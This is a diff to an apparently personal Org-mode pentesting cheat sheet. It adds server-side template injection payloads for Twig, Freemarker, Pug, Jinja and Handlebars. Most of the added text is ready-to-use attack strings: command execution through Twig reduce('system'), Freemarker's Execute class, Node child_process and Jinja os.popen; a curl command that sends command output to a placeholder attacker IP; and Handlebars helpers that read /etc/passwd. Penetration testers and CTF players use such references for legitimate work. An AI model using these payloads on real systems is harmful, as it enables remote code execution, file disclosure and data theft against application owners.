@@ -2440,7 +2440,81 @@
 **** Cheatsheets
      - [[https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection][HackTricks]]
      - [[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection][PayloadAllTheThings]]
-**** Flask / Jinja2
+**** Twig - PHP
+     - Detect
+       #+begin_src conf
+         {{5*5}}
+         {{5*'5'}}  # Also 25
+         Space {{-variable-}}
+       #+end_src
+     - RCE
+       #+begin_src conf
+         {{[0]|reduce('system','whoami')}}
+         # Check the docs of these functions:
+         #   filter, join, map, slice, and sort
+
+         # Data exfiliation
+         {% set output %}
+         {{[0]|reduce('system','whoami')}}
+         {% endset %}
+
+         {% set exfil = output| url_encode %}
+         {{[0]|reduce('system','curl http://<attacker-ip>/?exfil=' ~ exfil)}}
+       #+end_src
+**** Apache Freemarker - Java
+     - Susceptible to XSS
+     - ~.ftl~ files
+     - Detect
+       #+begin_src conf
+           ${8*8}
+           ${8*'8'} # Error (Java types)
+       #+end_src
+     - RCE
+       #+begin_src conf
+         # The Java class has to implement the
+         # TemplateModel class:
+         ${"freemarker.template.utility.Execute"?new()("whoami")}
+       #+end_src
+**** Pug / Jade - NodeJS / Express FW
+     - Detect
+       #+begin_src conf
+         # If the result is encompased by <> then
+         # it is Pug as it expects the first word
+         # of the line to be a tag: h1, p, div...
+
+         #{9*9}
+         #{"9"*9}  # Also 81
+       #+end_src
+     - RCE
+       #+begin_src conf
+         # 1st. Check if require mod is loaded
+         = require
+
+         # if not, see if found in the gobal obj
+         = global.process.mainModule.require
+
+         # if output, set it to a variable
+         - var require = global.process.mainModule.require
+
+         # Try loading the child_process module
+         = require('child_process')
+
+         # Run a system command
+         = require('child_process').spawnSync('whoami').stdout
+       #+end_src
+**** Jinja - Python / Flask FW
+     - Detect
+       #+begin_src conf
+         {{4*4}}
+         {{4*"4"}}   # Jinja if 4444
+         {{request}} # Jinja if <Request ...>
+         {{conf}}
+         {{session}}
+       #+end_src
+     - Configuration info
+       #+begin_src conf
+         {{conf|ppprint}}  # See Encryption_key
+       #+end_src
      - RCE
        #+begin_src conf
          # Bypass most common filters: '.',
@@ -2454,6 +2528,32 @@
 
          {{ namespace.__init__.__globals__.os.popen('<cmd>').read() }}
        #+end_src
+**** Mustache / Handlebars - JavaScript
+     - Handlebars is a less restrictive Mustache
+       - Only XSS & variable dump on Mustache
+     - Detect
+       #+begin_src conf
+         # Find a variable that might be set and:
+         {{#if name}}
+               {{name}}
+         {{/if}}
+
+         # Try erroring for non-existing vars
+         {{#each does_not_exist}}
+              {{this}}
+         {{/each}}
+       #+end_src
+     - Read files - ([[https://github.com/helpers/handlebars-helpers][handlebars-helpers]] script)
+       #+begin_src conf
+         # List directory
+         {{#each (readdir "/tmp")}}
+              {{this}}
+         {{/each}}
+
+         # Read file
+         {{read "/etc/passwd"}}
+       #+end_src
+     - RCE depends on imported modules and the underlying implementation
 **** Tplmap
      - [[https://github.com/epinna/tplmap][Site]] - SSTI detect & exploit tool
        #+begin_src sh
